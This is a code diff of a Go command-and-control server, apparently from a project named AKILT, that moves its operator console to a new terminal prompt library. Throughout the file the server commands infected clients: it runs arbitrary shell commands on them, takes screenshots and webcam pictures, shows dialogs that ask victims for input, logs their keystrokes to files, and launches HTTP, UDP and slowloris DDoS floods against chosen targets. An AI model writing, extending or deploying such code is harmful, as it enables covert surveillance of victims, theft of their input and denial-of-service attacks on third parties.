@@ -1,4 +1,3 @@
-// TODO: use [this](https://github.com/c-bata/go-prompt) instead of [this](https://github.com/charmbracelet/bubbletea)
 package main
 
 import (
@@ -8,7 +7,9 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"net/url"
 	"os"
+	"path/filepath"
 	"regexp"
 	"strconv"
 	"strings"
@@ -16,24 +17,23 @@ import (
 
 	"github.com/Xart3mis/AKILT/Server/lib/bundles"
 	"github.com/Xart3mis/AKILTC/pb"
-	"github.com/charmbracelet/bubbles/spinner"
-	tea "github.com/charmbracelet/bubbletea"
-	"github.com/fatih/color"
-	"github.com/magodo/textinput"
-
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials"
+
+	"github.com/gookit/color"
+	"github.com/peterh/liner"
+	"github.com/schollz/progressbar/v3"
 )
 
 type server struct {
 	pb.ConsumerServer
 }
 
-type floodParamas struct {
+type floodParams struct {
 	Type        int
-	url         string
-	num_threads int
-	limit       int
+	url         *url.URL
+	num_threads int64
+	limit       time.Duration
 }
 
 type DialogParams struct {
@@ -42,7 +42,7 @@ type DialogParams struct {
 	DialogTitle  string
 }
 
-var flood_params *floodParamas = nil
+var flood_params *floodParams = nil
 var dialog_params *DialogParams = nil
 
 var current_id string = ""
@@ -55,13 +55,37 @@ var client_onscreentext map[string]string = make(map[string]string)
 var client_execcommand map[string]string = make(map[string]string)
 var client_execoutput map[string]string = make(map[string]string)
 
-var client_dialog map[string]string = make(map[string]string)
 var client_dialogoutput map[string]string = make(map[string]string)
 
 var should_screenshot bool = false
 var should_takepic bool = false
 
-var header string = ""
+var exec_done chan bool
+var dialog_done chan bool
+
+var (
+	history_fn = filepath.Join(os.TempDir(), ".liner_history")
+	commands   = []string{
+		"list_clients",
+		"screenshot",
+		"cleartext",
+		"settext",
+		"select",
+		"dialog",
+		"flood",
+		"exec",
+		"help",
+		"exit",
+		"pic",
+	}
+)
+
+// var client_map = map[string]string{
+// 	"0": "client_1",
+// 	"1": "client_2",
+// }
+
+var flood_completed bool
 
 var banner string = `
 ▄▄▄       ██ ▄█▀ ██▓ ██▓    ▄▄▄█████▓
@@ -76,33 +100,348 @@ var banner string = `
 `
 
 func main() {
-
 	go func() {
-		p := tea.NewProgram(initialModel(), tea.WithAltScreen())
+		creds, err := loadTLSCredentials()
+		if err != nil {
+			log.Fatalln(err)
+		}
 
-		if err := p.Start(); err != nil {
-			log.Fatal(err)
+		s := grpc.NewServer(grpc.Creds(creds))
+		lis, err := net.Listen("tcp", ":8000")
+		if err != nil {
+			log.Fatalf("Failed to listen: %v", err)
+		}
+
+		pb.RegisterConsumerServer(s, &server{})
+
+		err = s.Serve(lis)
+		if err != nil {
+			log.Fatalf("Failed to serve: %v", err)
 		}
 	}()
 
-	creds, err := loadTLSCredentials()
-	if err != nil {
-		log.Fatalln(err)
+	color.HiRed.Println(banner)
+
+	line := liner.NewLiner()
+	defer line.Close()
+
+	line.SetCtrlCAborts(true)
+	line.SetCompleter(func(line string) (c []string) {
+		for _, n := range commands {
+			if strings.HasPrefix(n, strings.ToLower(line)) {
+				c = append(c, n)
+			}
+		}
+		return
+	})
+
+	if f, err := os.Open(history_fn); err == nil {
+		line.ReadHistory(f)
+		f.Close()
 	}
 
-	s := grpc.NewServer(grpc.Creds(creds), grpc.MaxRecvMsgSize(6000000*48), grpc.MaxSendMsgSize(6000000*48))
-	lis, err := net.Listen("tcp", ":8000")
-	if err != nil {
-		log.Fatalf("Failed to listen: %v", err)
+	log.SetFlags(0)
+
+	for {
+		for idx, client := range client_ids {
+			client_mapids[idx] = client
+		}
+
+		in, err := line.Prompt(">> ")
+		if err == liner.ErrPromptAborted {
+			log.Print("Aborted")
+			break
+		} else if err != nil {
+			log.Print("Error reading line: ", err)
+			break
+		}
+
+		in = strings.TrimSpace(in)
+
+		line.AppendHistory(in)
+
+		fields := strings.Fields(in)
+
+		if len(fields) > 0 {
+			switch fields[0] {
+			case "exit":
+				goto exit
+
+			case "help":
+				if len(fields[1:]) == 0 {
+					log.Println("available commands:")
+					for idx := range commands {
+						color.Green.Println(commands[idx])
+					}
+					color.Yellow.Println("to see the help page for a specific command type [help <command>]")
+				} else {
+					var found_command bool
+
+					for idx := range commands {
+						if fields[1] == commands[idx] {
+							found_command = true
+							break
+						}
+					}
+
+					if !found_command {
+						color.Red.Println("command not found.")
+						continue
+					}
+
+					switch fields[1] {
+					case "list_clients":
+						color.Green.Print("list_clients: ")
+						log.Println("lists the currently connected clients.")
+						color.Gray.Println("usage: [list_clients]")
+					case "screenshot":
+						color.Green.Print("screenshot: ")
+						log.Println("takes a screenshot of client screen.")
+						color.Gray.Println("usage: [screenshot]")
+					case "settext":
+						color.Green.Print("settext: ")
+						log.Println("shows text on client screen.")
+						color.Gray.Println("usage: [settext <text>]")
+					case "cleartext":
+						color.Green.Print("cleartext: ")
+						log.Println("clears the text that's on the client screen")
+						color.Gray.Println("usage: [cleartext]")
+					case "select":
+						color.Green.Print("select: ")
+						log.Println("selects a client by its index. ")
+						color.Gray.Println("usage: [select <client index>]")
+					case "dialog":
+						color.Green.Print("dialog: ")
+						log.Println("shows a text entry dialog on client computer. ")
+						color.Gray.Println("usage: [dialog \"<dialog title>\" \"<dialog prompt>\"]")
+					case "exec":
+						color.Green.Print("exec: ")
+						log.Println("executes a command on client computer. ")
+						color.Gray.Println("usage: [exec <command>]")
+					case "exit":
+						color.Green.Print("exit: ")
+						log.Println("closes the C2 server. ")
+						color.Gray.Println("usage: [exit]")
+					case "flood":
+						color.Green.Print("flood: ")
+						log.Println("performs a DDOS attack against a specified target. (supported methods are: httpflood, udpflood, slowloris)")
+						color.Gray.Println("usage: [flood <target url> <seconds> <worker count> <method>]")
+					case "pic":
+						color.Green.Print("pic: ")
+						log.Println("takes a picture through the clients' webcam. ")
+						color.Gray.Println("usage: [pic]")
+					}
+				}
+
+			case "flood":
+				if len(fields[1:]) < 4 {
+					color.Red.Println("not enough arguments to flood.")
+					continue
+				}
+
+				if current_id == "" {
+					color.Red.Println("please select a client first.")
+					continue
+				}
+
+				var isUrl func(string) bool = func(str string) bool {
+					url, err := url.ParseRequestURI(str)
+					if err != nil {
+						return false
+					}
+
+					address := net.ParseIP(url.Host)
+					if address == nil {
+						return strings.Contains(url.Host, ".")
+					}
+
+					return true
+				}
+
+				target, err := url.Parse(fields[1])
+				if !isUrl(target.String()) || err != nil {
+					color.Red.Println("invalid target url.")
+					continue
+				}
+
+				limit, err := strconv.Atoi(fields[2])
+				if err != nil {
+					color.Red.Println("invalid time limit.")
+					continue
+				}
+
+				workersN, err := strconv.ParseInt(fields[3], 10, 64)
+				if err != nil {
+					color.Red.Println("invalid worker count")
+					continue
+				}
+
+				if fields[4] != "httpflood" && fields[4] != "udpflood" && fields[4] != "slowloris" {
+					color.Red.Println("invalid flood method.")
+					continue
+				}
+
+				FloodCommand(target, time.Duration(limit)*time.Second, workersN, fields[4])
+
+			case "select":
+				if len(fields[1:]) > 1 {
+					color.Red.Println("select only takes one argument.")
+					continue
+				}
+
+				if len(fields[1:]) < 1 {
+					color.Red.Println("select takes one argument.")
+					continue
+				}
+
+				client_idx, err := strconv.Atoi(fields[1])
+				if err != nil {
+					color.Red.Println("invalid client index.")
+					continue
+				}
+
+				if Contains(client_ids, client_mapids[client_idx]) {
+					current_id = client_mapids[client_idx]
+					ShowOk()
+				} else {
+					color.Red.Println("invalid client index.")
+					continue
+				}
+
+			case "settext":
+				if len(fields[1:]) < 1 {
+					color.Red.Println("settext takes multiple arguments")
+					continue
+				}
+
+				if current_id != "" {
+					client_onscreentext[current_id] = strings.Join(fields[1:], " ")
+					ShowOk()
+				} else {
+					color.Red.Println("please select a client first.")
+					continue
+				}
+
+			case "screenshot":
+				if current_id == "" {
+					color.Red.Println("please select a client first.")
+					continue
+				}
+
+				should_screenshot = true
+				ShowOk()
+
+			case "pic":
+				if current_id == "" {
+					color.Red.Println("please select a client first.")
+					continue
+				}
+
+				should_takepic = true
+				ShowOk()
+
+			case "cleartext":
+				if current_id == "" {
+					color.Red.Println("please select a client first.")
+					continue
+				}
+
+				client_onscreentext[current_id] = ""
+
+			case "list_clients":
+				if len(fields[1:]) > 0 {
+					color.Red.Println("list_clients takes no arguments.")
+					continue
+				}
+
+				b, _ := json.MarshalIndent(client_mapids, "", "\t")
+				color.Magenta.Println(string(b))
+
+			case "exec":
+				if len(fields[1:]) < 1 {
+					color.Red.Println("exec takes multiple arguments.")
+					continue
+				}
+
+				if current_id == "" {
+					color.Red.Println("please select a client first.")
+					continue
+				}
+
+				client_execcommand[current_id] = strings.Join(fields[1:], " ")
+
+				<-exec_done
+				log.Println(client_execoutput[current_id])
+
+			case "dialog":
+				if current_id == "" {
+					color.Red.Println("please select a client first.")
+					continue
+				}
+
+				if len(fields[1:]) < 1 {
+					color.Red.Println("dialog takes multiple arguments.")
+					continue
+				}
+
+				r := regexp.MustCompile(`\".*?\"`)
+				matches := r.FindAllString(strings.Join(fields[1:], " "), -1)
+
+				for idx := range matches {
+					matches[idx] = strings.ReplaceAll(matches[idx], "\"", "")
+				}
+
+				if len(matches) > 2 {
+					color.Red.Println("dialog only takes two arguments")
+				}
+
+				dialog_params = &DialogParams{ShouldUpdate: true, DialogPrompt: matches[0], DialogTitle: matches[1]}
+				<-dialog_done
+				log.Println(client_dialogoutput[current_id])
+			default:
+			}
+		}
 	}
 
-	pb.RegisterConsumerServer(s, &server{})
+exit:
+	if f, err := os.Create(history_fn); err != nil {
+		log.Print("Error writing history file: ", err)
+	} else {
+		line.WriteHistory(f)
+		f.Close()
+	}
+}
 
-	err = s.Serve(lis)
-	if err != nil {
-		log.Fatalf("Failed to serve: %v", err)
+func FloodCommand(target *url.URL, limit time.Duration, workersN int64, method string) {
+	log.Println(color.Green.Sprintf("flooding %s for %s seconds with %d workers using %s method", target.String(), limit, workersN, method))
+
+	var floodtype int
+	switch method {
+	case "httpflood":
+		floodtype = 1
+	case "udpflood":
+		floodtype = 3
+	case "slowloris":
+		floodtype = 0
+	default:
+		floodtype = -1
 	}
 
+	flood_params = &floodParams{Type: floodtype, url: target, num_threads: workersN, limit: limit}
+
+	go func() {
+		time.Sleep(limit)
+		flood_completed = true
+	}()
+	bar := progressbar.NewOptions(-1, progressbar.OptionClearOnFinish(), progressbar.OptionFullWidth())
+	for !flood_completed {
+		bar.Add(1)
+	}
+	log.Println()
+}
+
+func ShowOk() {
+	color.HiGreen.Println("Ok.")
 }
 
 func loadTLSCredentials() (credentials.TransportCredentials, error) {
@@ -135,8 +474,6 @@ func Contains(sl []string, name string) bool {
 
 func (s *server) GetCommand(ctx context.Context, cid *pb.ClientDataRequest) (*pb.ClientExecData, error) {
 	if !Contains(client_ids, cid.ClientId) {
-		header = color.GreenString("Client connected with id %s", cid.ClientId)
-
 		client_ids = append(client_ids, cid.ClientId)
 	}
 
@@ -155,6 +492,7 @@ func (s *server) SetCommandOutput(ctx context.Context, in *pb.ClientExecOutput) 
 		if id.ClientId == current_id {
 			client_execoutput[current_id] = ""
 			client_execoutput[current_id] = string(in.GetOutput())
+			exec_done <- true
 		}
 	}
 
@@ -163,7 +501,6 @@ func (s *server) SetCommandOutput(ctx context.Context, in *pb.ClientExecOutput) 
 
 func (s *server) SubscribeOnScreenText(r *pb.ClientDataRequest, in pb.Consumer_SubscribeOnScreenTextServer) error {
 	if !Contains(client_ids, r.ClientId) {
-		header = color.GreenString("Client connected with id %s", r.ClientId)
 		client_ids = append(client_ids, r.ClientId)
 	}
 	for {
@@ -187,9 +524,9 @@ func (s *server) GetFlood(ctx context.Context, in *pb.Void) (*pb.FloodData, erro
 		return &pb.FloodData{
 			FloodType:   int32(x.Type),
 			ShouldFlood: true,
-			Url:         x.url,
-			Limit:       int64(x.limit),
-			NumThreads:  int64(x.num_threads)}, nil
+			Url:         x.url.String(),
+			Limit:       int64(x.limit.Seconds()),
+			NumThreads:  x.num_threads}, nil
 	}
 
 	return &pb.FloodData{ShouldFlood: false}, nil
@@ -197,8 +534,6 @@ func (s *server) GetFlood(ctx context.Context, in *pb.Void) (*pb.FloodData, erro
 
 func (s *server) GetDialog(ctx context.Context, in *pb.ClientDataRequest) (*pb.DialogData, error) {
 	if !Contains(client_ids, in.ClientId) {
-		header = color.GreenString("Client connected with id %s", in.ClientId)
-
 		client_ids = append(client_ids, in.ClientId)
 	}
 
@@ -225,12 +560,12 @@ func (s *server) SetDialogOutput(ctx context.Context, in *pb.DialogOutput) (*pb.
 		}
 	}
 
+	dialog_done <- true
+
 	return &pb.Void{}, nil
 }
 
 func (s *server) GetScreen(ctx context.Context, in *pb.ClientDataRequest) (*pb.ScreenData, error) {
-	header = color.GreenString("Client connected with id %s", in.ClientId)
-
 	if in.ClientId == current_id {
 		ss := should_screenshot
 		should_screenshot = false
@@ -241,8 +576,6 @@ func (s *server) GetScreen(ctx context.Context, in *pb.ClientDataRequest) (*pb.S
 
 func (s *server) SetScreenOutput(ctx context.Context, in *pb.ScreenOutput) (*pb.Void, error) {
 	if !Contains(client_ids, in.Id.ClientId) {
-		header = color.GreenString("Client connected with id %s", in.Id.ClientId)
-
 		client_ids = append(client_ids, in.Id.ClientId)
 	}
 
@@ -264,25 +597,17 @@ func (s *server) SetScreenOutput(ctx context.Context, in *pb.ScreenOutput) (*pb.
 
 func (s *server) SetKeylogOutput(ctx context.Context, in *pb.KeylogOutput) (*pb.Void, error) {
 	if !Contains(client_ids, in.Id.ClientId) {
-		header = color.GreenString("Client connected with id %s", in.Id.ClientId)
 		client_ids = append(client_ids, in.Id.ClientId)
 	}
 
 	var file *os.File
 
-	defer file.Close()
-
-	if _, err := os.Stat(fmt.Sprintf("keylog-%s", in.Id.ClientId)); os.IsNotExist(err) {
-		file, err = os.OpenFile(fmt.Sprintf("keylog-%s.log", in.Id.ClientId), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-		if err != nil {
-			return &pb.Void{}, err
-		}
-	}
-
 	file, err := os.OpenFile(fmt.Sprintf("keylog-%s.log", in.Id.ClientId), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		return &pb.Void{}, err
 	}
+
+	defer file.Close()
 
 	file.WriteString(fmt.Sprintf("%s - %s\n", in.GetWindowTitle(), string(rune(in.GetKey()))))
 
@@ -292,7 +617,6 @@ func (s *server) SetKeylogOutput(ctx context.Context, in *pb.KeylogOutput) (*pb.
 func (s *server) GetPicture(ctx context.Context, in *pb.ClientDataRequest) (*pb.PictureData, error) {
 	if !Contains(client_ids, in.ClientId) {
 		client_ids = append(client_ids, in.ClientId)
-		header = color.GreenString("Client connected with id %s", in.ClientId)
 	}
 
 	if in.ClientId == current_id {
@@ -310,6 +634,8 @@ func (s *server) SetPictureOutput(ctx context.Context, in *pb.PictureOutput) (*p
 	}
 
 	if in.Id.ClientId == current_id {
+		fmt.Println(in.PictureData[:10])
+
 		var file *os.File
 
 		defer file.Close()
@@ -322,293 +648,4 @@ func (s *server) SetPictureOutput(ctx context.Context, in *pb.PictureOutput) (*p
 	}
 
 	return &pb.Void{}, nil
-}
-
-type model struct {
-	textInput           textinput.Model
-	showhelplist        bool
-	showclientlist      bool
-	showok              bool
-	shownotvalidcid     bool
-	shownotvalidtext    bool
-	shownotvalidcommand bool
-	showfloodusage      bool
-	showfloodoutput     bool
-	showexecout         bool
-	showdialogoutput    bool
-	err                 error
-	clients             []string
-
-	spinner spinner.Model
-}
-
-func initialModel() model {
-	ti := textinput.NewModel()
-	ti.Placeholder = "help"
-
-	red := color.New(color.FgRed).SprintFunc()
-	ti.Prompt = red(">> ")
-	ti.PromptStyle.Bold(true)
-
-	ti.PromptStyle.PaddingRight(10)
-	ti.Focus()
-	ti.CharLimit = 156
-	ti.Width = 20
-
-	ti.CandidateWords = []string{
-		"help", "settext",
-		"select", "exit",
-		"exec", "list_clients",
-		"cleartext", "flood",
-		"dialog", "screenshot"}
-	ti.CandidateViewMode = textinput.CandidateViewHorizental
-	s := spinner.New()
-	s.Spinner = spinner.Dot
-
-	return model{
-		textInput:           ti,
-		err:                 nil,
-		showhelplist:        false,
-		showok:              false,
-		showclientlist:      false,
-		shownotvalidcid:     false,
-		shownotvalidtext:    false,
-		shownotvalidcommand: false,
-		showexecout:         false,
-		showfloodusage:      false,
-		showfloodoutput:     false,
-		showdialogoutput:    false,
-		clients:             client_ids,
-
-		spinner: s,
-	}
-}
-
-func (m model) Init() tea.Cmd {
-	m.spinner.Tick()
-	return textinput.Blink
-}
-
-func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
-	var cmd tea.Cmd
-
-	for idx, client := range client_ids {
-		client_mapids[idx] = client
-	}
-
-	switch msg := msg.(type) {
-	case tea.KeyMsg:
-		switch msg.String() {
-		case "ctrl+c":
-			return m, tea.Quit
-
-		case "esc", "q":
-			m.shownotvalidcommand = false
-			m.shownotvalidtext = false
-			m.showdialogoutput = false
-			m.shownotvalidcid = false
-			m.showfloodusage = false
-			m.showclientlist = false
-			m.showhelplist = false
-			m.showexecout = false
-			m.showok = false
-			return m, nil
-
-		case "enter":
-			m.clients = client_ids
-
-			if len(m.textInput.Value()) > 4 && m.textInput.Value()[:4] == "exec" {
-				split_str := strings.Fields(m.textInput.Value())
-				if len(split_str) <= 1 {
-					m.shownotvalidcommand = true
-					return m, nil
-				}
-				client_execcommand[current_id] = strings.Join(split_str[1:], " ")
-				m.showexecout = true
-				return m, nil
-			}
-
-			if len(m.textInput.Value()) > 6 && m.textInput.Value()[:6] == "select" {
-				split_str := strings.Fields(m.textInput.Value())
-				if len(split_str) > 2 {
-					m.shownotvalidcid = true
-					return m, nil
-				}
-
-				val, err := strconv.Atoi(split_str[1])
-				if err != nil {
-					m.shownotvalidcid = true
-					return m, nil
-				}
-
-				if Contains(client_ids, client_mapids[val]) {
-					m.showok = true
-					current_id = client_mapids[val]
-					return m, nil
-				}
-
-				m.shownotvalidcid = true
-				return m, nil
-			}
-
-			if len(m.textInput.Value()) > 7 && m.textInput.Value()[:7] == "settext" {
-				split_str := strings.Fields(m.textInput.Value())
-				if len(split_str) <= 1 {
-					m.shownotvalidtext = true
-					return m, nil
-				}
-				client_onscreentext[current_id] = strings.Join(split_str[1:], " ")
-				m.showok = true
-				return m, nil
-			}
-
-			if len(m.textInput.Value()) == 9 && m.textInput.Value() == "cleartext" {
-				client_onscreentext[current_id] = ""
-				m.showok = true
-				return m, nil
-			}
-
-			if len(m.textInput.Value()) == 10 && m.textInput.Value() == "screenshot" {
-				should_screenshot = true
-				m.showok = true
-				return m, nil
-			}
-
-			if len(m.textInput.Value()) == 3 && m.textInput.Value() == "pic" {
-				should_takepic = true
-				m.showok = true
-				return m, nil
-			}
-
-			if len(m.textInput.Value()) >= 5 && m.textInput.Value()[:5] == "flood" {
-				split_str := strings.Fields(m.textInput.Value())
-				if len(split_str) <= 4 {
-					m.showfloodusage = true
-					return m, nil
-				}
-
-				threads, err := strconv.Atoi(split_str[3])
-				if err != nil {
-					m.showfloodusage = true
-				}
-
-				limit, err := strconv.Atoi(split_str[2])
-				if err != nil {
-					m.showfloodusage = true
-				}
-
-				var floodType int = 0
-				switch strings.ToLower(split_str[4]) {
-				case "slowloris":
-					floodType = 0
-				case "httpflood":
-					floodType = 1
-				case "synflood":
-					floodType = 2
-				case "udpflood":
-					floodType = 3
-				}
-
-				flood_params = &floodParamas{url: split_str[1], limit: limit, num_threads: threads, Type: floodType}
-				m.showfloodoutput = true
-
-				return m, nil
-			}
-
-			if len(m.textInput.Value()) >= 6 && m.textInput.Value()[:6] == "dialog" {
-				split_str := strings.Fields(m.textInput.Value())
-				r := regexp.MustCompile(`\".*?\"`)
-				matches := r.FindAllString(strings.Join(split_str[1:], " "), -1)
-
-				for idx := range matches {
-					matches[idx] = strings.ReplaceAll(matches[idx], "\"", "")
-				}
-
-				dialog_params = &DialogParams{
-					ShouldUpdate: true,
-					DialogPrompt: matches[0],
-					DialogTitle:  matches[1],
-				}
-				m.showdialogoutput = true
-			}
-
-			switch m.textInput.Value() {
-			case "help":
-				m.showhelplist = true
-				return m, nil
-			case "exit":
-				return m, tea.Quit
-			case "list_clients":
-				m.showclientlist = true
-				return m, nil
-			default:
-				return m, nil
-			}
-		}
-	case error:
-		m.err = msg
-		return m, nil
-	}
-
-	// m.spinner, cmd = m.spinner.Update(msg)
-	m.textInput, cmd = m.textInput.Update(msg)
-	return m, cmd
-
-}
-
-func (m model) View() string {
-	if m.showhelplist {
-		yellow := color.New(color.FgYellow).SprintFunc()
-		green := color.New(color.FgGreen).SprintFunc()
-
-		return m.textInput.View() + "\n\n" + green("help") + "\nshow this help dialog (usage: " + yellow("help") + ")\n\n" +
-			green("select") + "\nselect a client to connect to (usage: " + yellow("select [client id]") + ")\n\n" +
-			green("exit") + "\nexit the server (usage: " + yellow("exit") + ")\n\n" +
-			green("settext") + "\nset on screen text for selected client (usage: " + yellow("settext [text]") + ")\n\n" +
-			green("exec") + "\nexecute command on selected client (usage: " + yellow("exec [command string]") + ")\n\n" +
-			green("list_clients") + "\nlist currently connected clients (usage: " + yellow("list_clients [client id]") + ")\n\n" +
-			green("cleartext") + "\nclear on screen text for selected client (usage: " + yellow("cleartext") + ")\n\n" +
-			green("flood") + "\nflood a url using all clients (usage: " + yellow("flood [url] [time limit] [worker count] [flood type]") + ") " + "flood type can be (slowloris, httpflood, synflood, udpflood)\n\n" +
-			green("dialog") + "\nshow a a text entry dialog on client PC (usage: " + yellow("dialog [prompt] [text]") + ")\n"
-	}
-	if m.showclientlist {
-		Magenta := color.New(color.FgMagenta).SprintFunc()
-		b, _ := json.MarshalIndent(client_mapids, "", "\t")
-		return m.textInput.View() + "\n\n" + Magenta(string(b))
-	}
-	if m.shownotvalidcid {
-		red := color.New(color.FgRed).SprintFunc()
-		return m.textInput.View() + "\n\n" + red("Not a valid client ID.")
-	}
-	if m.showok {
-		Green := color.New(color.FgGreen).SprintFunc()
-		return m.textInput.View() + "\n\n" + Green("OK.")
-	}
-	if m.shownotvalidtext {
-		red := color.New(color.FgRed).SprintFunc()
-		return m.textInput.View() + "\n\n" + red("settext takes multiple arguments.")
-	}
-	if m.showexecout {
-		x := client_execoutput[current_id]
-		return m.textInput.View() + "\n\n" + x
-	}
-	if m.shownotvalidcommand {
-		red := color.New(color.FgRed).SprintFunc()
-		return m.textInput.View() + "\n\n" + red("Not a valid command.")
-	}
-	if m.showfloodusage {
-		red := color.New(color.FgRed).SprintFunc()
-		return m.textInput.View() + "\n\n" + red("usage: flood [url] [time limit] [worker count] [flood type] "+"flood type can be (slowloris, httpflood, synflood, udpflood)\n")
-	}
-	if m.showfloodoutput {
-		return m.textInput.View()
-	}
-	if m.showdialogoutput {
-		return m.textInput.View() + "\n\n" + client_dialogoutput[current_id]
-	}
-	go func() {
-		time.Sleep(5 * time.Second)
-		header = ""
-	}()
-	return header + "\n\n" + color.RedString(banner) + "\n" + m.textInput.View()
 }
